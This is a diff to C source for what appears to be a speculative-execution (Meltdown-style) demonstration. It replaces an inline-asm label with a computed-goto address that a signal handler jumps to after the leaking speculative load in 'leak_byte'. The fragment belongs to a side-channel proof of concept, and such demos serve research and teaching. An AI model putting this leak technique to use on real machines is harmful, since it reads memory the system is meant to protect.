@@ -13,16 +13,16 @@
 #error This demo doesn't support the architecture you're building it on.
 #endif
 
-extern char after_speculation[];
+char *after_speculation_adr;
 char *private_page;
 
 static void handler(int signum __unused, siginfo_t *sinfo __unused, void *ctx)
 {
 	ucontext_t *ucontext = ctx;
 #if defined(TREX_POWER)
-	ucontext->uc_mcontext.regs->nip = (uintptr_t)after_speculation;
+	ucontext->uc_mcontext.regs->nip = (uintptr_t)after_speculation_adr;
 #elif defined(TREX_X86_64)
-	ucontext->uc_mcontext.gregs[REG_RIP] = (greg_t)after_speculation;
+	ucontext->uc_mcontext.gregs[REG_RIP] = (greg_t)after_speculation_adr;
 #endif
 }
 
@@ -40,6 +40,8 @@ static char leak_byte(size_t offset)
 {
 	struct timing_array *ta = ta_new();
 	int run, result;
+
+	after_speculation_adr = &&after_speculation;
 
 	for (run = 0;; run++) {
 		ta_flush(ta);
@@ -60,7 +62,7 @@ static char leak_byte(size_t offset)
 				trex_demo_exit(TREX_ERROR);
 			}
 
-			__asm__ volatile("after_speculation:");
+		after_speculation:
 
 			mprotect(private_page, page_size, PROT_READ | PROT_WRITE);
 		}
